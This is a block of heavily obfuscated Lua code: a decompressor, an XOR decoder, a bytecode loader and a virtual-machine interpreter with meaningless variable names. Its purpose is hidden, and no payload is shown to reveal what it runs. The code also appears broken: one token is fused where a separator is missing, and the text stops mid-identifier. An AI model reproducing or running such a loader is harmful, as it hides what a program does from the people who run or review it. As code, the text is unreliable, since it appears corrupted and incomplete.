return(function(IIlllIlIlIIIIllllIlllllII,IIIllIIlIIllIlIIII,IlllIllIIlIIlIlIlIlIIlll)local lIllIlllIlIIlIIlI=string.char;local IIIIIIIII=string.sub;local lllIlIIIIlIlIlIlllIIIlIll=table.concat;local lllIlIIllIllllllllIll=math.ldexp;local llIlllIIIlIIIl=getfenv or function()return _ENV end;local IIllIIIlIl=select;local IlllIIIIIllIIllIIIIIll=unpack or table.unpack;local llIIllIIIIlIlIIIIlllIIIl=tonumber;local function lllIIIIIIIllIllllIlllI(IlllIIIIIllIIllIIIIIll)local llIlIIlIIllIll,lIIIllllIllIIlll,IIllIllIllIllIlIlI="","",{}local lllIlIlllIIIIl=256;local IllIllIlIlIlllIlIIll={}for IIIllIIlIIllIlIIII=0,lllIlIlllIIIIl-1 do IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII]=lIllIlllIlIIlIIlI(IIIllIIlIIllIlIIII)end;local IIIllIIlIIllIlIIII=1;local function IIlllIlIlIIIIllllIlllllII()local llIlIIlIIllIll=llIIllIIIIlIlIIIIlllIIIl(IIIIIIIII(IlllIIIIIllIIllIIIIIll,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII),36)IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+1;local lIIIllllIllIIlll=llIIllIIIIlIlIIIIlllIIIl(IIIIIIIII(IlllIIIIIllIIllIIIIIll,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII+llIlIIlIIllIll-1),36)IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+llIlIIlIIllIll;return lIIIllllIllIIlll end;llIlIIlIIllIll=lIllIlllIlIIlIIlI(IIlllIlIlIIIIllllIlllllII())IIllIllIllIllIlIlI[1]=llIlIIlIIllIll;while IIIllIIlIIllIlIIII<#IlllIIIIIllIIllIIIIIll do local IIIllIIlIIllIlIIII=IIlllIlIlIIIIllllIlllllII()if IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII]then lIIIllllIllIIlll=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII]else lIIIllllIllIIlll=llIlIIlIIllIll..IIIIIIIII(llIlIIlIIllIll,1,1)end;IllIllIlIlIlllIlIIll[lllIlIlllIIIIl]=llIlIIlIIllIll..IIIIIIIII(lIIIllllIllIIlll,1,1)IIllIllIllIllIlIlI[#IIllIllIllIllIlIlI+1],llIlIIlIIllIll,lllIlIlllIIIIl=lIIIllllIllIIlll,lIIIllllIllIIlll,lllIlIlllIIIIl+1 end;return table.concat(IIllIllIllIllIlIlI)end;local llIIllIIIIlIlIIIIlllIIIl=lllIIIIIIIllIllllIllllocal IIIllIIlIIllIlIIII=(bit or bit32);local lllIlIlllIIIIl=IIIllIIlIIllIlIIII and IIIllIIlIIllIlIIII.bxor or function(IIIllIIlIIllIlIIII,lIIIllllIllIIlll)local llIlIIlIIllIll,lllIlIlllIIIIl,IIIIIIIII=1,0,10 while IIIllIIlIIllIlIIII>0 and lIIIllllIllIIlll>0 do local IIllIllIllIllIlIlI,IIIIIIIII=IIIllIIlIIllIlIIII%2,lIIIllllIllIIlll%2 if IIllIllIllIllIlIlI~=IIIIIIIII then lllIlIlllIIIIl=lllIlIlllIIIIl+llIlIIlIIllIll end IIIllIIlIIllIlIIII,lIIIllllIllIIlll,llIlIIlIIllIll=(IIIllIIlIIllIlIIII-IIllIllIllIllIlIlI)/2,(lIIIllllIllIIlll-IIIIIIIII)/2,llIlIIlIIllIll*2 end if IIIllIIlIIllIlIIII<lIIIllllIllIIlll then IIIllIIlIIllIlIIII=lIIIllllIllIIlll end while IIIllIIlIIllIlIIII>0 do local lIIIllllIllIIlll=IIIllIIlIIllIlIIII%2 if lIIIllllIllIIlll>0 then lllIlIlllIIIIl=lllIlIlllIIIIl+llIlIIlIIllIll end IIIllIIlIIllIlIIII,llIlIIlIIllIll=(IIIllIIlIIllIlIIII-lIIIllllIllIIlll)/2,llIlIIlIIllIll*2 end return lllIlIlllIIIIl end local function lIIIllllIllIIlll(llIlIIlIIllIll,IIIllIIlIIllIlIIII,lIIIllllIllIIlll)if lIIIllllIllIIlll then local IIIllIIlIIllIlIIII=(llIlIIlIIllIll/2^(IIIllIIlIIllIlIIII-1))%2^((lIIIllllIllIIlll-1)-(IIIllIIlIIllIlIIII-1)+1);return IIIllIIlIIllIlIIII-IIIllIIlIIllIlIIII%1;else local IIIllIIlIIllIlIIII=2^(IIIllIIlIIllIlIIII-1);return(llIlIIlIIllIll%(IIIllIIlIIllIlIIII+IIIllIIlIIllIlIIII)>=IIIllIIlIIllIlIIII)and 1 or 0;end;end;local IIIllIIlIIllIlIIII=1;local function llIlIIlIIllIll()local IIllIllIllIllIlIlI,llIlIIlIIllIll,IIIIIIIII,lIIIllllIllIIlll=IIlllIlIlIIIIllllIlllllII(llIIllIIIIlIlIIIIlllIIIl,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII+3);IIllIllIllIllIlIlI=lllIlIlllIIIIl(IIllIllIllIllIlIlI,234)llIlIIlIIllIll=lllIlIlllIIIIl(llIlIIlIIllIll,234)IIIIIIIII=lllIlIlllIIIIl(IIIIIIIII,234)lIIIllllIllIIlll=lllIlIlllIIIIl(lIIIllllIllIIlll,234)IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+4;return(lIIIllllIllIIlll*16777216)+(IIIIIIIII*65536)+(llIlIIlIIllIll*256)+IIllIllIllIllIlIlI;end;local function IllIllIlIlIlllIlIIll()local llIlIIlIIllIll=lllIlIlllIIIIl(IIlllIlIlIIIIllllIlllllII(llIIllIIIIlIlIIIIlllIIIl,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII),234);IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+1;return llIlIIlIIllIll;end;local function IIllIllIllIllIlIlI()local lIIIllllIllIIlll,llIlIIlIIllIll=IIlllIlIlIIIIllllIlllllII(llIIllIIIIlIlIIIIlllIIIl,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII+2);lIIIllllIllIIlll=lllIlIlllIIIIl(lIIIllllIllIIlll,234)llIlIIlIIllIll=lllIlIlllIIIIl(llIlIIlIIllIll,234)IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+2;return(llIlIIlIIllIll*256)+lIIIllllIllIIlll;end;local function llllIlII()local IIIllIIlIIllIlIIII=llIlIIlIIllIll();local llIlIIlIIllIll=llIlIIlIIllIll();local IIIIIIIII=1;local lllIlIlllIIIIl=(lIIIllllIllIIlll(llIlIIlIIllIll,1,20)*(2^32))+IIIllIIlIIllIlIIII;local IIIllIIlIIllIlIIII=lIIIllllIllIIlll(llIlIIlIIllIll,21,31);local llIlIIlIIllIll=((-1)^lIIIllllIllIIlll(llIlIIlIIllIll,32));if(IIIllIIlIIllIlIIII==0)then if(lllIlIlllIIIIl==0)then return llIlIIlIIllIll*0;else IIIllIIlIIllIlIIII=1;IIIIIIIII=0;end;elseif(IIIllIIlIIllIlIIII==2047)then return(lllIlIlllIIIIl==0)and(llIlIIlIIllIll*(1/0))or(llIlIIlIIllIll*(0/0));end;return lllIlIIllIllllllllIll(llIlIIlIIllIll,IIIllIIlIIllIlIIII-1023)*(IIIIIIIII+(lllIlIlllIIIIl/(2^52)));end;local lllIIIIIIIllIllllIlllI=llIlIIlIIllIll;local function lllIlIIllIllllllllIll(llIlIIlIIllIll)local lIIIllllIllIIlll;if(not llIlIIlIIllIll)then llIlIIlIIllIll=lllIIIIIIIllIllllIlllI();if(llIlIIlIIllIll==0)then return'';end;end;lIIIllllIllIIlll=IIIIIIIII(llIIllIIIIlIlIIIIlllIIIl,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII+llIlIIlIIllIll-1);IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII+llIlIIlIIllIll;local llIlIIlIIllIll={}for IIIllIIlIIllIlIIII=1,#lIIIllllIllIIlll do llIlIIlIIllIll[IIIllIIlIIllIlIIII]=lIllIlllIlIIlIIlI(lllIlIlllIIIIl(IIlllIlIlIIIIllllIlllllII(IIIIIIIII(lIIIllllIllIIlll,IIIllIIlIIllIlIIII,IIIllIIlIIllIlIIII)),234))end return lllIlIIIIlIlIlIlllIIIlIll(llIlIIlIIllIll);end;local IIIllIIlIIllIlIIII=llIlIIlIIllIll;local function lllIlIIIIlIlIlIlllIIIlIll(...)return{...},IIllIIIlIl('#',...)end local function llIIllIIIIlIlIIIIlllIIIl()local lIllIlllIlIIlIIlI={};local IlllIIIIIllIIllIIIIIll={};local IIIllIIlIIllIlIIII={};local IIlllIlIlIIIIllllIlllllII={[#{"1 + 1 = 111";"1 + 1 = 111";}]=IlllIIIIIllIIllIIIIIll,[#{"1 + 1 = 111";{655;628;284;532};{877;815;162;895};}]=nil,[#{{117;136;67;543};{811;572;708;884};{327;505;367;125};{376;56;931;660};}]=IIIllIIlIIllIlIIII,[#{"1 + 1 = 111";}]=lIllIlllIlIIlIIlI,};local IIIllIIlIIllIlIIII=llIlIIlIIllIll()local lllIlIlllIIIIl={}for lIIIllllIllIIlll=1,IIIllIIlIIllIlIIII do local llIlIIlIIllIll=IllIllIlIlIlllIlIIll();local IIIllIIlIIllIlIIII;if(llIlIIlIIllIll==3)then IIIllIIlIIllIlIIII=(IllIllIlIlIlllIlIIll()~=0);elseif(llIlIIlIIllIll==1)then IIIllIIlIIllIlIIII=llllIlII();elseif(llIlIIlIIllIll==0)then IIIllIIlIIllIlIIII=lllIlIIllIllllllllIll();end;lllIlIlllIIIIl[lIIIllllIllIIlll]=IIIllIIlIIllIlIIII;end;for IlllIIIIIllIIllIIIIIll=1,llIlIIlIIllIll()do local IIIllIIlIIllIlIIII=IllIllIlIlIlllIlIIll();if(lIIIllllIllIIlll(IIIllIIlIIllIlIIII,1,1)==0)then local IIIIIIIII=lIIIllllIllIIlll(IIIllIIlIIllIlIIII,2,3);local IllIllIlIlIlllIlIIll=lIIIllllIllIIlll(IIIllIIlIIllIlIIII,4,6);local IIIllIIlIIllIlIIII={IIllIllIllIllIlIlI(),IIllIllIllIllIlIlI(),nil,nil};if(IIIIIIIII==0)then IIIllIIlIIllIlIIII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]=IIllIllIllIllIlIlI();IIIllIIlIIllIlIIII[#("ZFrQ")]=IIllIllIllIllIlIlI();elseif(IIIIIIIII==1)then IIIllIIlIIllIlIIII[#("sYb")]=llIlIIlIIllIll();elseif(IIIIIIIII==2)then IIIllIIlIIllIlIIII[#("nz5")]=llIlIIlIIllIll()-(2^16)elseif(IIIIIIIII==3)then IIIllIIlIIllIlIIII[#("Ch2")]=llIlIIlIIllIll()-(2^16)IIIllIIlIIllIlIIII[#("6lut")]=IIllIllIllIllIlIlI();end;if(lIIIllllIllIIlll(IllIllIlIlIlllIlIIll,1,1)==1)then IIIllIIlIIllIlIIII[#{{422;163;297;851};"1 + 1 = 111";}]=lllIlIlllIIIIl[IIIllIIlIIllIlIIII[#("Tp")]]end if(lIIIllllIllIIlll(IllIllIlIlIlllIlIIll,2,2)==1)then IIIllIIlIIllIlIIII[#("r9n")]=lllIlIlllIIIIl[IIIllIIlIIllIlIIII[#("AK8")]]end if(lIIIllllIllIIlll(IllIllIlIlIlllIlIIll,3,3)==1)then IIIllIIlIIllIlIIII[#("1tfI")]=lllIlIlllIIIIl[IIIllIIlIIllIlIIII[#("P0iK")]]end lIllIlllIlIIlIIlI[IlllIIIIIllIIllIIIIIll]=IIIllIIlIIllIlIIII;end end;for IIIllIIlIIllIlIIII=1,llIlIIlIIllIll()do IlllIIIIIllIIllIIIIIll[IIIllIIlIIllIlIIII-1]=llIIllIIIIlIlIIIIlllIIIl();end;IIlllIlIlIIIIllllIlllllII[3]=IllIllIlIlIlllIlIIll();return IIlllIlIlIIIIllllIlllllII;end;local function lIllIlllIlIIlIIlI(IIIllIIlIIllIlIIII,IIlllIlIlIIIIllllIlllllII,IllIllIlIlIlllIlIIll)IIIllIIlIIllIlIIII=(IIIllIIlIIllIlIIII==true and llIIllIIIIlIlIIIIlllIIIl())or IIIllIIlIIllIlIIII;return(function(...)local lllIlIlllIIIIl=IIIllIIlIIllIlIIII[1];local IIIIIIIII=IIIllIIlIIllIlIIII[3];local lllIIIIIIIllIllllIlllI=IIIllIIlIIllIlIIII[2];local IIIllIIlIIllIlIIII=lllIlIIIIlIlIlIlllIIIlIll local llIlIIlIIllIll=1;local IIIllIIlIIllIlIIII=-1;local lllIlIIIIlIlIlIlllIIIlIll={};local IIllIllIllIllIlIlI={...};local IIllIIIlIl=IIllIIIlIl('#',...)-1;local llIIllIIIIlIlIIIIlllIIIl={};local lIIIllllIllIIlll={};for IIIllIIlIIllIlIIII=0,IIllIIIlIl do if(IIIllIIlIIllIlIIII>=IIIIIIIII)then lllIlIIIIlIlIlIlllIIIlIll[IIIllIIlIIllIlIIII-IIIIIIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII+1];else lIIIllllIllIIlll[IIIllIIlIIllIlIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII+#{"1 + 1 = 111";}];end;end;local IIIllIIlIIllIlIIII=IIllIIIlIl-IIIIIIIII+1 local IIIllIIlIIllIlIIII;local IIllIllIllIllIlIlI;while true do IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIllIllIllIllIlIlI=IIIllIIlIIllIlIIII[#("6")];if IIllIllIllIllIlIlI<=#("AGaFy1DcFd")then if IIllIllIllIllIlIlI<=#("8lZ2")then if IIllIllIllIllIlIlI<=#("g")then if IIllIllIllIllIlIlI==#("")then do return end;else lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("1x")]]=IIIllIIlIIllIlIIII[#("bEb")];end;elseif IIllIllIllIllIlIlI<=#("Tj")then lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("dL")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#{{750;60;114;713};"1 + 1 = 111";{238;795;364;371};}]];elseif IIllIllIllIllIlIlI>#("xzr")then local IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII[#("5f")]lIIIllllIllIIlll[IIIllIIlIIllIlIIII](lIIIllllIllIIlll[IIIllIIlIIllIlIIII+1])else lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("lm")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("6Zv")]];end;elseif IIllIllIllIllIlIlI<=#("RSbXcoW")then if IIllIllIllIllIlIlI<=#("ROxIi")then local llIlIIlIIllIll=IIIllIIlIIllIlIIII[#("1G")]lIIIllllIllIIlll[llIlIIlIIllIll](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,llIlIIlIIllIll+1,IIIllIIlIIllIlIIII[#("1B4")]))elseif IIllIllIllIllIlIlI>#("YSiULv")then local IIllIllIllIllIlIlI;local IIIIIIIII;lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Aa")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("SmZ")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#{"1 + 1 = 111";"1 + 1 = 111";}];IIllIllIllIllIlIlI=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("epv")]];lIIIllllIllIIlll[IIIIIIIII+1]=IIllIllIllIllIlIlI;lIIIllllIllIIlll[IIIIIIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII[#("1yjy")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("1p")]]=IIIllIIlIIllIlIIII[#("qJX")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("BI")]lIIIllllIllIIlll[IIIIIIIII]=lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("6TO")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("5A")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("p5z")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("MC")];IIllIllIllIllIlIlI=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("X64")]];lIIIllllIllIIlll[IIIIIIIII+1]=IIllIllIllIllIlIlI;lIIIllllIllIIlll[IIIIIIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII[#("2nWg")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#{{316;219;323;762};"1 + 1 = 111";}]]=IIIllIIlIIllIlIIII[#("GGP")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("TK")]lIIIllllIllIIlll[IIIIIIIII]=lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("W8z")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("MW")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("e0b")]][IIIllIIlIIllIlIIII[#{"1 + 1 = 111";{664;879;341;275};"1 + 1 = 111";"1 + 1 = 111";}]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("iV")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("VWH")]][IIIllIIlIIllIlIIII[#("QDBa")]];else lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("eL")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("h5X")]];end;elseif IIllIllIllIllIlIlI<=#{"1 + 1 = 111";"1 + 1 = 111";{231;844;946;567};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{692;301;660;557};"1 + 1 = 111";}then local llIlIIlIIllIll=IIIllIIlIIllIlIIII[#("fq")]lIIIllllIllIIlll[llIlIIlIIllIll](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,llIlIIlIIllIll+1,IIIllIIlIIllIlIIII[#("UbE")]))elseif IIllIllIllIllIlIlI>#("jLmPjUaSb")then local llIlIIlIIllIll=IIIllIIlIIllIlIIII[#("zL")];local lllIlIlllIIIIl=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("lGO")]];lIIIllllIllIIlll[llIlIIlIIllIll+1]=lllIlIlllIIIIl;lIIIllllIllIIlll[llIlIIlIIllIll]=lllIlIlllIIIIl[IIIllIIlIIllIlIIII[#("NSGr")]];else local llIlIIlIIllIll=IIIllIIlIIllIlIIII[#("na")]lIIIllllIllIIlll[llIlIIlIIllIll]=lIIIllllIllIIlll[llIlIIlIIllIll](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,llIlIIlIIllIll+1,IIIllIIlIIllIlIIII[#("bfK")]))end;elseif IIllIllIllIllIlIlI<=#("mrhnsJqZ4BkMX6Of")then if IIllIllIllIllIlIlI<=#("amX19CLFWuEhe")then if IIllIllIllIllIlIlI<=#("BTAiXFbSa9I")then lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("DM")]]=IIIllIIlIIllIlIIII[#("rjQ")];elseif IIllIllIllIllIlIlI>#("a5IXpaeqaFnt")then local llIlIIlIIllIll=IIIllIIlIIllIlIIII[#{{706;322;362;992};{439;359;376;794};}]lIIIllllIllIIlll[llIlIIlIIllIll]=lIIIllllIllIIlll[llIlIIlIIllIll](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,llIlIIlIIllIll+1,IIIllIIlIIllIlIIII[#("KTt")]))else local IIIllIIlIIllIlIIII=IIIllIIlIIllIlIIII[#("sK")]lIIIllllIllIIlll[IIIllIIlIIllIlIIII](lIIIllllIllIIlll[IIIllIIlIIllIlIIII+1])end;elseif IIllIllIllIllIlIlI<=#("ZGTHnWS0UU3yY1")then local IlllIIIIIllIIllIIIIIll=lllIIIIIIIllIllllIlllI[IIIllIIlIIllIlIIII[#("j7X")]];local IIllIllIllIllIlIlI;local IIIIIIIII={};IIllIllIllIllIlIlI=IlllIllIIlIIlIlIlIlIIlll({},{__index=function(llIlIIlIIllIll,IIIllIIlIIllIlIIII)local IIIllIIlIIllIlIIII=IIIIIIIII[IIIllIIlIIllIlIIII];return IIIllIIlIIllIlIIII[1][IIIllIIlIIllIlIIII[2]];end,__newindex=function(lIIIllllIllIIlll,IIIllIIlIIllIlIIII,llIlIIlIIllIll)local IIIllIIlIIllIlIIII=IIIIIIIII[IIIllIIlIIllIlIIII]IIIllIIlIIllIlIIII[1][IIIllIIlIIllIlIIII[2]]=llIlIIlIIllIll;end;});for IIllIllIllIllIlIlI=1,IIIllIIlIIllIlIIII[#{{214;183;345;307};{327;586;613;719};{486;733;174;590};"1 + 1 = 111";}]do llIlIIlIIllIll=llIlIIlIIllIll+1;local IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];if IIIllIIlIIllIlIIII[#{{279;698;801;211};}]==3 then IIIIIIIII[IIllIllIllIllIlIlI-1]={lIIIllllIllIIlll,IIIllIIlIIllIlIIII[#{{811;712;467;911};"1 + 1 = 111";{221;68;10;442};}]};else IIIIIIIII[IIllIllIllIllIlIlI-1]={IIlllIlIlIIIIllllIlllllII,IIIllIIlIIllIlIIII[#("zNQ")]};end;llIIllIIIIlIlIIIIlllIIIl[#llIIllIIIIlIlIIIIlllIIIl+1]=IIIIIIIII;end;lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("4i")]]=lIllIlllIlIIlIIlI(IlllIIIIIllIIllIIIIIll,IIllIllIllIllIlIlI,IllIllIlIlIlllIlIIll);elseif IIllIllIllIllIlIlI>#("CsmYsiCP78fEcYR")then lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("bQ")]]=IIlllIlIlIIIIllllIlllllII[IIIllIIlIIllIlIIII[#("jW6")]];else local IIllIllIllIllIlIlI;local IIIIIIIII;lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("gH")]]=IIlllIlIlIIIIllllIlllllII[IIIllIIlIIllIlIIII[#("bCC")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("gS")];IIllIllIllIllIlIlI=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("tDZ")]];lIIIllllIllIIlll[IIIIIIIII+1]=IIllIllIllIllIlIlI;lIIIllllIllIIlll[IIIIIIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII[#("0LTX")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("yx")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("qq5")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("1Z")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("f7l")]][IIIllIIlIIllIlIIII[#("Cv4k")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("tm")]]=IIIllIIlIIllIlIIII[#("LF7")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("4F")]]=IIIllIIlIIllIlIIII[#("ozG")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("Zq")]lIIIllllIllIIlll[IIIIIIIII]=lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("BlH")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("23")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("ASM")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("G0")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("nmH")]][IIIllIIlIIllIlIIII[#("Szno")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("ij")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("re8")]][IIIllIIlIIllIlIIII[#("dWL8")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("od")]lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("iYY")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("5s")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("FEx")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#{{161;946;575;206};"1 + 1 = 111";}]]=IIIllIIlIIllIlIIII[#("Crr")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("Me")]lIIIllllIllIIlll[IIIIIIIII](lIIIllllIllIIlll[IIIIIIIII+1])llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("f0")]]=IIlllIlIlIIIIllllIlllllII[IIIllIIlIIllIlIIII[#("Zjp")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("G9")];IIllIllIllIllIlIlI=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("5RZ")]];lIIIllllIllIIlll[IIIIIIIII+1]=IIllIllIllIllIlIlI;lIIIllllIllIIlll[IIIIIIIII]=IIllIllIllIllIlIlI[IIIllIIlIIllIlIIII[#("mAhb")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("4a")]]=IllIllIlIlIlllIlIIll[IIIllIIlIIllIlIIII[#("6BJ")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("jm")]]=lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("PAy")]][IIIllIIlIIllIlIIII[#("i12x")]];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("Dn")]]=IIIllIIlIIllIlIIII[#("Bcg")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];lIIIllllIllIIlll[IIIllIIlIIllIlIIII[#("JL")]]=IIIllIIlIIllIlIIII[#("HqO")];llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIlIIlIIllIll];IIIIIIIII=IIIllIIlIIllIlIIII[#("sp")]lIIIllllIllIIlll[IIIIIIIII]=lIIIllllIllIIlll[IIIIIIIII](IlllIIIIIllIIllIIIIIll(lIIIllllIllIIlll,IIIIIIIII+1,IIIllIIlIIllIlIIII[#("Kfp")]))llIlIIlIIllIll=llIlIIlIIllIll+1;IIIllIIlIIllIlIIII=lllIlIlllIIIIl[llIl